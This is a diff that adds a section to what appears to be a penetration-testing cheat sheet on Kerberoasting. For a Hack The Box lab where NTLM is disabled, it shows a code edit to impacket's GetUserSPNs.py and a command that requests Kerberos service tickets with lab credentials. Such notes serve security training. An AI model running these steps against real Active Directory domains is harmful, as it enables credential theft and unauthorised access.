@@ -48,3 +48,20 @@ When you have valid credentials for any account, try on Kerberoasting -> Brutefo
 
 ![](https://i.imgur.com/0ZOozST.png)
 
+### NTLM Auth Disabled
+
+In such case like [HTB-Scrambled](https://0xdf.gitlab.io/2022/10/01/htb-scrambled-linux.html), NTLM authentication might be disabled for security purpose and you won't be able to use standard tools and you won't be able to access any any service by IP address if it requires authentication.
+
+Edit some lines on **GetUserSpns.py** around line 260:
+
+
+```python
+        if self.__doKerberos:
+            #target = self.getMachineName()
+            target = self.__kdcHost
+```
+
+After making that change, you can use the **-k** flag:
+
+`GetUserSPNs.py scrm.local/ksimpson:ksimpson -dc-ip dc1.scrm.local -request -k`
+
